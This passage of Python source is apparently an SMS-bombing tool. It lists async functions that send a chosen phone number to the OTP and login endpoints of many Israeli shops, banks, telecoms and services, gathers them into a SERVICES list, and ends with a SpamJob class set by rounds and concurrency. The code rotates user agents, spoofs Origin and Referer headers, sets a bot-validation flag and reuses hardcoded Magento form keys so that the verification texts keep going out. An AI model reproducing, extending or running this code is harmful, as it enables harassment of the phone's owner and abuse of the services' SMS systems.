        ("https://www.cal-online.co.il/api/otp", {"mobile": p}),
        ("https://www.cal-online.co.il/api/otp", {"phone": p}),
        ("https://www.cal-online.co.il/api/otp/send", {"mobile": p}),
    ])

async def solid_max(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.max.co.il/api/auth/otp", {"phone": p}),
        ("https://www.max.co.il/api/otp", {"phone": p}),
    ])

async def solid_bit(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.bitpay.co.il/api/otp/send", {"phone": p}),
        ("https://www.bitpay.co.il/api/otp", {"phone": p}),
    ])

async def solid_buyme(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.buyme.co.il/api/otp", {"phone": p}),
        ("https://www.buyme.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_yad2(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.yad2.co.il/api/auth/otp", {"phone": p}),
        ("https://www.yad2.co.il/api/otp/send", {"phone": p}),
        ("https://www.yad2.co.il/api/otp", {"phone": p}),
    ])

async def solid_madlan(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.madlan.co.il/api/otp", {"phone": p}),
        ("https://www.madlan.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_drushim(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.drushim.co.il/api/otp/send", {"phone": p}),
        ("https://www.drushim.co.il/api/otp", {"phone": p}),
    ])

async def solid_alljobs(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.alljobs.co.il/api/otp", {"mobile": p}),
        ("https://www.alljobs.co.il/api/otp", {"phone": p}),
    ])

async def solid_issta(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.issta.co.il/api/otp", {"phone": p}),
        ("https://www.issta.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_lametayel(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.lametayel.co.il/api/auth/otp", {"phone": p}),
        ("https://www.lametayel.co.il/api/otp", {"phone": p}),
    ])

async def solid_dominos(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.dominos.co.il/api/otp", {"phone": p}),
        ("https://www.dominos.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_mcdonalds(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.mcdonalds.co.il/api/otp", {"phone": p}),
        ("https://www.mcdonalds.co.il/api/auth/otp", {"phone": p}),
    ])

async def solid_aroma(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.aroma.co.il/api/otp", {"phone": p}),
        ("https://www.aroma.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_cafecafe(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.cafecafe.co.il/api/otp", {"phone": p}),
        ("https://www.cafecafe.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_terminalx(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.terminalx.com/api/customer/otp", {"phone": p}),
        ("https://www.terminalx.com/api/otp", {"phone": p}),
        ("https://www.terminalx.com/api/customer/sendOtp", {"phone": p}),
    ], {"Origin": "https://www.terminalx.com"})
    if ok:
        return True
    return await _magento_live(session, "https://www.terminalx.com", phone)

async def solid_fox(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.fox.co.il/api/customer/sendOtp", {"phone": p}),
        ("https://www.fox.co.il/api/otp", {"phone": p}),
    ], {"Origin": "https://www.fox.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.fox.co.il", phone)

async def solid_castro(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.castro.com/api/customer/otp", {"phone": p}),
        ("https://www.castro.com/api/otp", {"phone": p}),
    ], {"Origin": "https://www.castro.com"})
    if ok:
        return True
    return await _magento_live(session, "https://www.castro.com", phone)

async def solid_golf(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.golf.co.il/api/otp", {"phone": p}),
        ("https://www.golf.co.il/api/customer/otp", {"phone": p}),
    ], {"Origin": "https://www.golf.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.golf.co.il", phone)

async def solid_renuar(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.renuar.co.il/api/otp/send", {"phone": p}),
        ("https://www.renuar.co.il/api/otp", {"phone": p}),
    ], {"Origin": "https://www.renuar.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.renuar.co.il", phone)

async def solid_laline(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.laline.co.il/api/auth/otp", {"phone": p}),
        ("https://www.laline.co.il/api/otp", {"phone": p}),
    ], {"Origin": "https://www.laline.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.laline.co.il", phone)

async def solid_ivory(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ivory.co.il/api/otp", {"phone": p}),
        ("https://www.ivory.co.il/api/otp/send", {"phone": p}),
    ])

async def solid_ksp(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ksp.co.il/api/otp/send", {"phone": p}),
        ("https://www.ksp.co.il/api/otp", {"phone": p}),
    ])

async def solid_bolt(session, phone):
    return await _probe_json(session, [
        ("https://user.live.boltsvc.net/signup/phone/verify",
         {"phone": pplus(phone), "version": "PH.2.90"}),
        ("https://user.live.boltsvc.net/signup/phone/verify",
         {"phone": pplus(phone)}),
    ])

async def solid_micropay(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.micropay.co.il/extApi/sendOtp.php",
         {"phone": p, "type": "sms", "get": "1"}),
        ("https://www.micropay.co.il/extApi/sendOtp.php",
         {"phone": p, "type": "sms"}),
    ])

async def solid_aliexpress(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode",
         {"channel": p, "channelType": "PHONE", "channelPrefix": "972", "lang": "iw_IL",
          "umidTokenType": "SECURITY_TOKEN",
          "umidToken": "T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y="}),
        ("https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode",
         {"channel": p972(phone), "channelType": "PHONE", "channelPrefix": "972", "lang": "iw_IL"}),
    ])

SOLID2 = [
    ("SOLID2 Shufersal", solid_shufersal),
    ("SOLID2 Victory", solid_victory),
    ("SOLID2 Yochananof", solid_yochananof),
    ("SOLID2 TivTaam", solid_tivtaam),
    ("SOLID2 OsherAd", solid_osherad),
    ("SOLID2 Keshet", solid_keshet),
    ("SOLID2 Partner", solid_partner),
    ("SOLID2 HotMobile", solid_hotmobile),
    ("SOLID2 Golan", solid_golan),
    ("SOLID2 Pelephone", solid_pelephone),
    ("SOLID2 012", solid_012),
    ("SOLID2 019", solid_019),
    ("SOLID2 Wecom", solid_wecom),
    ("SOLID2 Bezeq", solid_bezeq),
    ("SOLID2 Cellopark", solid_cellopark),
    ("SOLID2 Ahuzot", solid_ahuzot),
    ("SOLID2 RavKav", solid_ravkav),
    ("SOLID2 Rail", solid_rail),
    ("SOLID2 Isracard", solid_isracard),
    ("SOLID2 Cal", solid_cal),
    ("SOLID2 Max", solid_max),
    ("SOLID2 Bit", solid_bit),
    ("SOLID2 Buyme", solid_buyme),
    ("SOLID2 Yad2", solid_yad2),
    ("SOLID2 Madlan", solid_madlan),
    ("SOLID2 Drushim", solid_drushim),
    ("SOLID2 AllJobs", solid_alljobs),
    ("SOLID2 Issta", solid_issta),
    ("SOLID2 Lametayel", solid_lametayel),
    ("SOLID2 Dominos", solid_dominos),
    ("SOLID2 McDonalds", solid_mcdonalds),
    ("SOLID2 Aroma", solid_aroma),
    ("SOLID2 CafeCafe", solid_cafecafe),
    ("SOLID2 TerminalX", solid_terminalx),
    ("SOLID2 Fox", solid_fox),
    ("SOLID2 Castro", solid_castro),
    ("SOLID2 Golf", solid_golf),
    ("SOLID2 Renuar", solid_renuar),
    ("SOLID2 Laline", solid_laline),
    ("SOLID2 Ivory", solid_ivory),
    ("SOLID2 KSP", solid_ksp),
    ("SOLID2 Bolt", solid_bolt),
    ("SOLID2 Micropay", solid_micropay),
    ("SOLID2 AliExpress", solid_aliexpress),
]



# ── SOLID3 — 20 new free site OTP probes ──
async def solid3_rest(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.rest.co.il/api/otp", {"phone": p}),
        ("https://www.rest.co.il/api/otp/send", {"phone": p}),
        ("https://www.rest.co.il/api/auth/otp", {"phoneNumber": p}),
    ], {"Origin": "https://www.rest.co.il"})

async def solid3_japanjapan(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.japan-japan.co.il/api/otp", {"phone": p}),
        ("https://www.japan-japan.co.il/api/otp/send", {"phone": p}),
        ("https://www.japan-japan.co.il/api/auth/sendOtp", {"mobile": p}),
    ])

async def solid3_landwer(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.landwer.co.il/api/otp", {"phone": p}),
        ("https://www.landwer.co.il/api/otp/send", {"phone": p}),
    ])

async def solid3_paz(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.paz.co.il/api/otp/send", {"phone": p}),
        ("https://www.paz.co.il/api/otp", {"phone": p}),
        ("https://www.paz.co.il/api/auth/otp", {"mobile": p}),
    ])

async def solid3_delek(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.delek.co.il/api/auth/otp", {"phone": p}),
        ("https://www.delek.co.il/api/otp", {"phone": p}),
        ("https://www.delek.co.il/api/otp/send", {"phoneNumber": p}),
    ])

async def solid3_yellow(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.yellow.co.il/api/otp", {"phone": p}),
        ("https://www.yellow.co.il/api/otp/send", {"phone": p}),
    ])

async def solid3_ampm(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ampm.co.il/api/otp", {"phone": p}),
        ("https://www.ampm.co.il/api/otp/send", {"phone": p}),
        ("https://www.ampm.co.il/api/auth/otp", {"mobile": p}),
    ])

async def solid3_homecenter(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.homecenter.co.il/api/otp", {"phone": p}),
        ("https://www.homecenter.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.homecenter.co.il", phone)

async def solid3_shilav(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.shilav.co.il/api/otp", {"phone": p}),
        ("https://www.shilav.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.shilav.co.il", phone)

async def solid3_toysrus(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.toysrus.co.il/api/otp", {"phone": p}),
        ("https://www.toysrus.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.toysrus.co.il", phone)

async def solid3_officedepot(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.officedepot.co.il/api/otp", {"phone": p}),
        ("https://www.officedepot.co.il/api/customer/otp", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.officedepot.co.il", phone)

async def solid3_bug(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.bug.co.il/api/otp", {"phone": p}),
        ("https://www.bug.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.bug.co.il", phone)

async def solid3_lastprice(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.lastprice.co.il/api/otp", {"phone": p}),
        ("https://www.lastprice.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.lastprice.co.il", phone)

async def solid3_steimatzky(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.steimatzky.co.il/api/otp", {"phone": p}),
        ("https://www.steimatzky.co.il/api/customer/otp", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.steimatzky.co.il", phone)

async def solid3_photoland(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.photoland.co.il/api/otp", {"phone": p}),
        ("https://www.photoland.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.photoland.co.il", phone)

async def solid3_cameracenter(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.cameracenter.co.il/api/otp", {"phone": p}),
        ("https://www.cameracenter.co.il/api/auth/otp", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.cameracenter.co.il", phone)

async def solid3_nextil(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.next.co.il/api/otp", {"phone": p}),
        ("https://www.next.co.il/api/customer/otp", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.next.co.il", phone)

async def solid3_adidas(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.adidas.co.il/api/otp", {"phone": p}),
        ("https://www.adidas.co.il/api/auth/otp", {"phone": p}),
        ("https://www.adidas.co.il/api/customer/sendOtp", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.adidas.co.il", phone)

async def solid3_newbalance(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.newbalance.co.il/api/otp", {"phone": p}),
        ("https://www.newbalance.co.il/api/customer/otp", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.newbalance.co.il", phone)

async def solid3_reebok(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.reebok.co.il/api/otp", {"phone": p}),
        ("https://www.reebok.co.il/api/otp/send", {"phone": p}),
    ])
    if ok:
        return True
    return await _magento_live(session, "https://www.reebok.co.il", phone)

SOLID3 = [
    ("SOLID3 Rest", solid3_rest),
    ("SOLID3 JapanJapan", solid3_japanjapan),
    ("SOLID3 Landwer", solid3_landwer),
    ("SOLID3 Paz", solid3_paz),
    ("SOLID3 Delek", solid3_delek),
    ("SOLID3 Yellow", solid3_yellow),
    ("SOLID3 AMPM", solid3_ampm),
    ("SOLID3 Homecenter", solid3_homecenter),
    ("SOLID3 Shilav", solid3_shilav),
    ("SOLID3 ToysRUs", solid3_toysrus),
    ("SOLID3 OfficeDepot", solid3_officedepot),
    ("SOLID3 Bug", solid3_bug),
    ("SOLID3 LastPrice", solid3_lastprice),
    ("SOLID3 Steimatzky", solid3_steimatzky),
    ("SOLID3 PhotoLand", solid3_photoland),
    ("SOLID3 CameraCenter", solid3_cameracenter),
    ("SOLID3 NextIL", solid3_nextil),
    ("SOLID3 Adidas", solid3_adidas),
    ("SOLID3 NewBalance", solid3_newbalance),
    ("SOLID3 Reebok", solid3_reebok),
]



# ── REQUESTED brands — free OTP (Magento + JSON probes) ──
async def req_ace(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.ace.co.il/api/customer/sendOtp", {"phone": p, "phoneNumber": p}),
        ("https://www.ace.co.il/api/customer/sendOtp", {"phone": p972(phone)}),
        ("https://www.ace.co.il/api/otp/send", {"phone": p}),
    ], {"Origin": "https://www.ace.co.il", "Referer": "https://www.ace.co.il/"})
    if ok:
        return True
    return await _magento_live(session, "https://www.ace.co.il", phone)

async def req_golfkids(session, phone):
    return await _magento_site(
        session,
        "https://www.golfkids.co.il/customer/ajax/post/",
        "https://www.golfkids.co.il",
        phone,
        form_key="LDj1irsNU9E9W3Uj",
    )


async def req_timberland(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.timberland.co.il/api/otp", {"phone": p}),
        ("https://www.timberland.co.il/api/customer/otp", {"phone": p}),
        ("https://www.timberland.co.il/api/customer/sendOtp", {"phone": p}),
    ], {"Origin": "https://www.timberland.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.timberland.co.il", phone)

async def req_intima(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.intima-il.co.il/api/otp", {"phone": p}),
        ("https://www.intima-il.co.il/api/customer/otp", {"phone": p}),
    ], {"Origin": "https://www.intima-il.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.intima-il.co.il", phone)

async def req_aldo(session, phone):
    p = p0(phone)
    for origin in ("https://www.aldo.co.il", "https://www.aldoshoes.co.il", "https://aldo.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/customer/sendOtp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        if await _magento_live(session, origin, phone):
            return True
    return False

async def req_govisit(session, phone):
    p = p0(phone)
    for origin in ("https://www.govisit.co.il", "https://govisit.co.il", "https://www.go-visit.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/otp/send", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
            (origin + "/customer/ajax/post/", None),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_papaya(session, phone):
    p = p0(phone)
    for origin in ("https://www.papaya.co.il", "https://papaya.co.il", "https://www.papayafashion.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/auth/otp", {"mobile": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_bathbody(session, phone):
    p = p0(phone)
    for origin in ("https://www.bathandbodyworks.co.il", "https://www.bbw.co.il", "https://bathbody-il.co.il", "https://www.bathbody.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/customer/sendOtp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_kiko(session, phone):
    p = p0(phone)
    for origin in ("https://www.kikocosmetics.co.il", "https://www.kiko.co.il", "https://kiko.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_gali(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.gali.co.il/api/otp", {"phone": p}),
        ("https://www.gali.co.il/api/customer/otp", {"phone": p}),
        ("https://www.gali.co.il/api/customer/sendOtp", {"phone": p}),
    ], {"Origin": "https://www.gali.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.gali.co.il", phone)

async def req_yochananof(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.yochananof.co.il/api/otp", {"phone": p}),
        ("https://www.yochananof.co.il/api/otp/send", {"phone": p}),
        ("https://www.yochananof.co.il/api/auth/otp", {"phoneNumber": p}),
        ("https://www.yochananof.co.il/api/login/otp", {"phone": p}),
    ], {"Origin": "https://www.yochananof.co.il", "Referer": "https://www.yochananof.co.il/"})

async def req_histadrut(session, phone):
    p = p0(phone)
    return await _probe_form(session, [
        ("https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined", f"phone={p}"),
        ("https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined", f"phone={p972(phone)}"),
        ("https://signup.histadrut.org.il/na_ajax.php?action=sms", f"phone={p}"),
    ], {"Origin": "https://signup.histadrut.org.il", "Referer": "https://signup.histadrut.org.il/"})

async def req_chita(session, phone):
    p = p0(phone)
    for origin in ("https://www.chita.co.il", "https://chita.co.il", "https://www.chitaotp.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/otp/send", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
    return False

async def req_10bis(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p, "culture": "he-IL"}),
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p, "culture": "he-IL", "sendMethod": "sms"}),
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p972(phone), "culture": "he-IL"}),
    ], {"Origin": "https://www.10bis.co.il", "Referer": "https://www.10bis.co.il/"})

async def req_mami(session, phone):
    p = p0(phone)
    for origin in ("https://www.mami.co.il", "https://mami.co.il", "https://www.mami-shop.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/otp/send", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_loveme(session, phone):
    p = p0(phone)
    for origin in ("https://www.loveme.co.il", "https://loveme.co.il", "https://www.love-me.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_zest(session, phone):
    p = p0(phone)
    for origin in ("https://www.zest.co.il", "https://zest.co.il", "https://www.zest-il.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/otp/send", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_pink(session, phone):
    p = p0(phone)
    for origin in ("https://www.pink.co.il", "https://pink.co.il", "https://www.pinkil.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/customer/sendOtp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_noyhasade(session, phone):
    p = p0(phone)
    for origin in ("https://www.noyhasade.co.il", "https://noyhasade.co.il", "https://www.noy-hasade.co.il", "https://app.noyhasade.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/otp/send", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
            (origin + "/api/v1/auth/otp", {"phone": p}),
            (origin + "/api/v1/login/otp", {"mobile": p}),
        ], {"Origin": origin})
        if ok:
            return True
    return False

async def req_urbanica(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.urbanica-wh.com/api/otp", {"phone": p}),
        ("https://www.urbanica-wh.com/api/customer/otp", {"phone": p}),
        ("https://www.urbanica-wh.com/api/customer/sendOtp", {"phone": p}),
    ], {"Origin": "https://www.urbanica-wh.com"})
    if ok:
        return True
    return await _magento_live(session, "https://www.urbanica-wh.com", phone)

async def req_insurance(session, phone):
    p = p0(phone)
    for origin in ("https://www.insurance.co.il", "https://insurance.co.il", "https://www.wobi.co.il", "https://www.harel-group.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/otp/send", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
    return False

async def req_ronenchen(session, phone):
    p = p0(phone)
    for origin in ("https://www.ronenchen.co.il", "https://ronenchen.co.il", "https://www.rc-fashion.co.il"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/customer/sendOtp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

async def req_delta(session, phone):
    p = p0(phone)
    for origin in ("https://www.delta.co.il", "https://delta.co.il", "https://www.delta-galil.co.il", "https://www.deltagalil.com"):
        ok = await _probe_json(session, [
            (origin + "/api/otp", {"phone": p}),
            (origin + "/api/customer/otp", {"phone": p}),
            (origin + "/api/customer/sendOtp", {"phone": p}),
            (origin + "/api/auth/otp", {"phone": p}),
        ], {"Origin": origin})
        if ok:
            return True
        try:
            if await _magento_live(session, origin, phone):
                return True
        except Exception:
            pass
    return False

REQUESTED = [
    ("REQ ACE Online", req_ace),
    ("REQ Golf Kids", req_golfkids),
    ("REQ Timberland", req_timberland),
    ("REQ Intima", req_intima),
    ("REQ Aldo", req_aldo),
    ("REQ GoVisit", req_govisit),
    ("REQ Papaya", req_papaya),
    ("REQ BathBody IL", req_bathbody),
    ("REQ Kiko", req_kiko),
    ("REQ Gali", req_gali),
    ("REQ Yochananof", req_yochananof),
    ("REQ Histadrut", req_histadrut),
    ("REQ ChitaOTP", req_chita),
    ("REQ 10bis", req_10bis),
    ("REQ Mami", req_mami),
    ("REQ LoveMe", req_loveme),
    ("REQ Zest", req_zest),
    ("REQ Pink", req_pink),
    ("REQ Noy Hasade", req_noyhasade),
    ("REQ Urbanica", req_urbanica),
    ("REQ Insurance", req_insurance),
    ("REQ RonenChen", req_ronenchen),
    ("REQ Delta", req_delta),
]





# ── Captured live Magento payloads (user-supplied) — priority ──
async def _cap_magento(session, origin: str, phone: str, default_key: str) -> bool:
    p = p0(phone)
    url = origin.rstrip("/") + "/customer/ajax/post/"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": origin,
        "Referer": origin.rstrip("/") + "/customer/account/login/",
    }
    keys = []
    try:
        live = await fetch_form_key(session, origin)
        if live:
            keys.append(live)
    except Exception:
        pass
    keys.append(default_key)
    seen = set()
    keys = [k for k in keys if not (k in seen or seen.add(k))]
    for key in keys:
        data = {"form_key": key, "bot_validation": "1", "type": "login", "telephone": p}
        status, body = await post_data(session, url, headers, data, timeout=12.0)
        if status in (200, 201, 202):
            b = (body or "").lower()
            if "errors\":false" in b or "verify-code" in b or "sms" in b:
                return True
            if "invalid" not in b and "form key" not in b:
                return True
            # Hebrew success often present even with unicode escapes
            if "\u05e0\u05e9\u05dc\u05d7" in (body or "") or "נשלח" in (body or ""):
                return True
    return False

async def cap_ace(session, phone):
    p = p0(phone)
    origin = "https://www.ace.co.il"
    endpoints = [
        origin + "/customer/ajax/post/",
        origin + "/rest/V1/customer/sendOtp",
        origin + "/api/customer/sendOtp",
    ]
    headers_base = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": origin,
        "Referer": origin + "/",
    }
    key = "M2n2gnKLkgg1RhJU"
    try:
        live = await fetch_form_key(session, origin)
        if live:
            key = live
    except Exception:
        pass
    data = {"form_key": key, "newaut": "1", "phone": p, "addintinalInfo": ""}
    for url in endpoints:
        h = {**headers_base, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        status, body = await post_data(session, url, h, data, timeout=12.0)
        if status in (200, 201, 202):
            return True
        status, body = await post_json(session, url, {**headers_base, "Content-Type": "application/json"}, {"phone": p, "form_key": key, "newaut": "1"}, timeout=12.0)
        if status in (200, 201, 202):
            return True
    return False

async def cap_timberland(session, phone):
    return await _cap_magento(session, "https://www.timberland.co.il", phone, "8Byx74ulmE8HqSpY")

async def cap_intima(session, phone):
    return await _cap_magento(session, "https://www.intima-il.co.il", phone, "zkzB5HeKZGcbGy4C")

async def cap_aldo(session, phone):
    for origin in ("https://www.aldo.co.il", "https://www.aldoshoes.co.il"):
        if await _cap_magento(session, origin, phone, "6ZH7ExQ6rbwOCtR6"):
            return True
    return False

async def cap_papaya(session, phone):
    return await _cap_magento(session, "https://www.papaya.co.il", phone, "Pf8BQC9c2QwDzS2g")

async def cap_bathbody(session, phone):
    return await _cap_magento(session, "https://www.bathandbodyworks.co.il", phone, "reiQZF8niIqYF261")

async def cap_kiko(session, phone):
    for origin in ("https://www.kikocosmetics.co.il", "https://www.kiko.co.il"):
        if await _cap_magento(session, origin, phone, "iyYug50w8y0sJPeX"):
            return True
    return False

async def cap_gali(session, phone):
    return await _cap_magento(session, "https://www.gali.co.il", phone, "mmuNmXpDgXxOlc4Q")

async def cap_golfkids(session, phone):
    return await _cap_magento(session, "https://www.golfkids.co.il", phone, "LDj1irsNU9E9W3Uj")

CAPTURED = [
    ("CAP Timberland", cap_timberland),
    ("CAP Intima", cap_intima),
    ("CAP Papaya", cap_papaya),
    ("CAP BathBody", cap_bathbody),
    ("CAP Kiko", cap_kiko),
    ("CAP Gali", cap_gali),
    ("CAP GolfKids", cap_golfkids),
    ("CAP ACE", cap_ace),
    ("CAP Aldo", cap_aldo),
]




SERVICES = CAPTURED + REQUESTED + SOLID + SOLID2 + SOLID3 + CORE + [_mk_mag(n, o) for n, o in MAGENTO_LIVE] + NEW_JSON + EXTRA + EXTRA2


_seen = set()
_uniq = []
for n, fn in SERVICES:
    if n not in _seen:
        _seen.add(n)
        _uniq.append((n, fn))
SERVICES = _uniq


# ─────────────────────────────────────────────
# JOB STATE
# ─────────────────────────────────────────────
@dataclass
class SpamJob:
    phone: str
    rounds: int
    concurrency: int
